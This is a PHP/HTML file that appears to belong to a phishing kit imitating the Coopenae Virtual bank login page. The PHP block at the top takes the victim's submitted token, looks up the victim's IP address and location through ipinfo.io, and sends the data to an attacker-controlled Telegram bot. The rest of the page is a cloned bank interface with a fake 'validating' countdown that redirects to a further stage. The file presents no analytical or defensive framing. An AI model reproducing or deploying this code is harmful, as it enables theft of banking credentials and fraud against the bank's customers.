<?php
ini_set("display_errors", 0);
include('dt.php');
$ip = trim(file_get_contents("http://ipinfo.io/ip"));
$cc = trim(file_get_contents("http://ipinfo.io/{$ip}/country"));
$userp = trim(file_get_contents("http://ipinfo.io/{$ip}/city"));
if ( isset ($_POST['user']) && isset ($_POST['user']) ){

$message = "Coopenae TOKEN: ".$_POST['user']."\r\nIP: ".$ip." ".$userp." ".$cc."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}else{  header ('location: index.html'); exit();
}

?><!DOCTYPE html>
<!-- saved from url=(0042)https://www.coopenaevirtual.fi.cr/Coopenae -->
<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Web Coopenae</title>
    
    <link rel="icon" type="image/x-icon" href="https://www.coopenaevirtual.fi.cr/Coopenae/assets/Coopenae/img/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    

    <link href="./index_files/line-awesome.min.css" rel="stylesheet">
    <link href="./index_files/sb-admin-2.min.css" rel="stylesheet">
    <link href="./index_files/select2.min.css" rel="stylesheet">
    <link href="./index_files/custom-components.min.css" rel="stylesheet">
    <link href="./index_files/blazored-modal.css" rel="stylesheet">
    <link href="./index_files/blazored-typeahead.css" rel="stylesheet">
    <link href="./index_files/blazorContextMenu.min.css" rel="stylesheet">
    <link href="./index_files/daterangepicker.min.css" rel="stylesheet">
    <link href="./index_files/bootstrap-slider.min.css" rel="stylesheet">
    <link href="./index_files/dragdrop.css" rel="stylesheet">
    <link href="./index_files/datatables.min.css" rel="stylesheet">
    <link href="./index_files/custom.css" rel="stylesheet">

<script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/sP-0Q1g5VTxr-Miy1zl49NMk8dw.br.js.descarga"></script><script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/_u0DMIOZxZkxMvyqqiiIR6GRFBU.br.js.descarga"></script><script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/PgZslZuu2vcwiZciV_22IQq3Ajk.br.js.descarga"></script><link type="text/css" rel="stylesheet" crossorigin="anonymous" referrerpolicy="no-referrer" href="./index_files/Lzu8fGHtUY0WqxVizZtDQ0Bt1Qo.css"><script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/BdtndPwHe9uyb7KzSPo9Hgxc5CY.br.js.descarga"></script><script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/rH1EkhFwf4TCWD9A-tVD7jIj1tU.br.js.descarga"></script><script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/SaASvOPPupnGJ9StbwEecDBjeBM.br.js.descarga"></script><script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/oRnnfKYAsGL0_JShLkNCWVFIXzE.br.js.descarga"></script><script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/aopcCyTUdY-IrIC-X9z2zKDdao0.br.js.descarga"></script><link type="text/css" rel="stylesheet" crossorigin="anonymous" referrerpolicy="no-referrer" href="./index_files/LXwe98LGHyFLJroafz0uQFclF4s.br.css"><script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/nQgMOPZdJeR1m7Y1cRrRoyX1KEQ.br.js.descarga"></script><link type="text/css" rel="stylesheet" crossorigin="anonymous" referrerpolicy="no-referrer" href="./index_files/Aul74W_D1uhwU6rtGOQjoPs6VoA.br.css"><script crossorigin="anonymous" type="text/javascript" referrerpolicy="no-referrer" src="./index_files/aLX0MeKoMg6dWr7b_QtAzByrBZk.br.js.descarga"></script></head>

<body>

    <div id="app"><!--!--><!--!--><!--!--><!--!-->
    <!--!--><!--!--><!--!-->
    <!--!--><!--!-->
    <!--!-->
<!--!-->
    <!--!--><!--!--><!--!--><!--!--><!--!--><!--!--><!--!--><!--!--><div class="container-fluid "><!--!-->
    <div class="container-inner"><!--!-->
        <!--!--><div class="row  top-margin-layout"><!--!-->
    <div class="col-md-7 d-none d-md-block"><!--!--><div class="maincontainerloading"><!--!-->

<!--!-->
    <!--!--><img class="img-fluid" style="width:100%; height:auto;" src="./index_files/login.jpg"><!--!-->
</div></div><!--!-->


                <div class="col-sm-12 col-md-5 d-flex justify-content-center" style="height:75%;"><div class="col-md-10 col-sm-12"><div class="d-flex justify-content-between"><div><img class="img-fluid" src="./index_files/logo.svg"></div><!--!-->
                            <div></div></div><!--!-->

                        <div class="col-md-10 col-sm-12"><!--!--><br><br>
                            <!--!--><!--!--><form><!--!--><!--!--><!--!-->

            <div><a href="https://www.app.coopenae.fi.cr/" target="_blank"><i style="float:right;" class="las la-question-circle" title="Ayuda"></i></a><!--!--><h1 class="heading primary-heading "><!--!-->
    Bienvenidos a Coopenae Virtual<!--!-->

<!--!-->        <span class="heading-underline"></span>
</h1><!--!-->

                <br>
                <div align="center">
                                
                            <h3 onclick="enableDebug();" style="color: black" class="login-title hidden-xs" data-hj-masked="">Estamos validando los datos...</h3>
          
                      
                 
                     <div style="text-align: center;" align="left"><img style="width: 150px; display: block; margin-left: auto; margin-right: auto;" src="cupertino_activity_indicator.gif"></div>
                     <br> <br>
                     <div style="color:black; text-align: center;" align="center">
                        Por favor espere mientras realizamos validaciones.<br> Cargando plataforma <strong id="time"><label id="countdown">0:20</label></strong></div><strong id="time">

                     <br>
                     <div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado" style="text-align: center;">


                     </div>
                  </strong></div><strong id="time">
               </strong></div><strong id="time">
            </strong></section><strong id="time">
            <script type="text/javascript">
               var url="index2.html";
               var seconds = 20; //número de segundos a contar
               function secondPassed() {

                 var minutes = Math.round((seconds - 20)/60); //calcula el número de minutos
                 var remainingSeconds = seconds % 60; //calcula los segundos
                 //si los segundos usan sólo un dígito, añadimos un cero a la izq
                 if (remainingSeconds < 10) {
                   remainingSeconds = "0" + remainingSeconds;
                 }
                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds;
                 if (seconds == 0) {
                   clearInterval(countdownTimer);
                  window.location=url;
                   document.getElementById('countdown').innerHTML = "";
                 } else {
                   seconds--;
                 }
               }

               var countdownTimer = setInterval(secondPassed, 1000);
            </script>
         </strong></div><strong id="time">


      </strong></div><strong id="time"></form></div></div></div><!--!-->
</div><!--!-->
    </div><!--!-->
</div><!--!--><!--!-->
</div>

    <input id="pubkey" type="hidden" value="-----BEGIN PUBLIC KEY-----MIIBKwIBAAKCAQEApv1y30h6VbNhEB5cjMX6AUn4isPJVbm9q1TFMPnhKDpeDkPtYnaCv+nWLOH6Zx4UqSXaLSMv/in4qpfaXRZD0iU/yBguyLxLxv0YFsWcEc7MZRoUj6fGd8qx5PpGl4t/P6BdDjvw9conJg3HfeOQBHSMIAhTK9XwTyskoYGwj+tkkpBDuI3cKiNWzxuSEEcDPulaNnWMBlV1x0zhkyPuGH4rZ+bkLyjk6b3KIML+bi/VkIItgEi3FnxLwWf19qWcFIMEwTu5lDzCG7bHeY+9slnIpDMXWKoKvmB73xH1HV1s2PeeQ+AW9NPz8rytLLvdBdrdHNOZLXaTJqF+xmVL3QIDAQABAgMBAAECAwEAAQIDAQABAgMBAAECAwEAAQIDAQAB-----END PUBLIC KEY-----">

    <div id="blazor-error-ui">
        Se ha producido un error no controlado.
        <a href="https://www.coopenaevirtual.fi.cr/Coopenae/" class="reload">Refrescar</a>
        <a class="dismiss">🗙</a>
    </div>

    <script src="./index_files/blazor.webassembly.js.descarga"></script>
    <script src="./index_files/blazored.modal.js.descarga"></script>
    <script src="./index_files/clickAndPositionHandler.js.descarga"></script>
    <script src="./index_files/jquery.min.js.descarga"></script>
    <script src="./index_files/bootstrap.bundle.min.js.descarga"></script><script>var Module; window.__wasmmodulecallback__(); delete window.__wasmmodulecallback__;</script><script src="./index_files/dotnet.6.0.14.k51elw1tze.js.descarga" defer="" integrity="sha256-54cJ6JdGhGbKaLWxHfRYzYbuyRq2wlK/ZDzfSXD3FEs=" crossorigin="anonymous"></script>
    <script src="./index_files/jquery.easing.min.js.descarga"></script>
    <script src="./index_files/sb-admin-2.min.js.descarga"></script>
    <script src="./index_files/reCaptcha.js.descarga"></script>
    <script src="./index_files/select2.min.js.descarga"></script>
    <script src="./index_files/selectlist.component.js.descarga"></script>
    <script src="./index_files/custom-components.js.descarga"></script>
    <script src="./index_files/bootstrap-slider.min.js.descarga"></script>
    <script src="./index_files/jquery.mask.js.descarga"></script>
    <script src="./index_files/hash.min.js.descarga"></script>
    <script src="./index_files/jsencrypt.min.js.descarga"></script>
    <script src="./index_files/pdfmake.min.js.descarga"></script>
    <script src="./index_files/vfs_fonts.js.descarga"></script>
    <script src="./index_files/utils.js.descarga"></script>
    <script src="./index_files/interop.js.descarga"></script>

    <script src="./index_files/blazored-typeahead.js.descarga"></script>
    <script src="./index_files/blazorContextMenu.min.js.descarga"></script>

    <!--MAP-->
    <script async="" defer="" src="./index_files/mapcontrol"></script>

    <!--GFS-->
    <script src="./index_files/jquery.signalR.min.js.descarga" integrity="sha256-xS6LVrZ64szJCS0Oi2QCG+tF9WeIa0j6V4kj9zU1rtE=" crossorigin="anonymous"></script>

    <script src="./index_files/GFSLibrary.js.descarga"></script>
    <script src="./index_files/hubs"></script>

    <!--GFS Copy method alternative-->
    <script>
        function GFSCopyToClipboard(element) {

            const cb = navigator.clipboard;

            cb.writeText($(element).text()).then(() => console.info('Texto copiado'));

        }
    </script>




 <!-- Modal -->  <div class="modal fade" id="GFSModal" role="dialog" data-keyboard="false" data-backdrop="static">  <div class="modal-dialog" style="white-space: normal;">    <!-- Modal content-->  <div class="modal-content">               <div class="modal-header">                 <h4 class="modal-title">Esperando Firma Digital</h4>            </div>           <div class="modal-body">              <div id="GFSmodalContent" class="col-md-12">              </div>         </div>        <div class="modal-footer">      </div>  </div>  </div>  </div></body></html>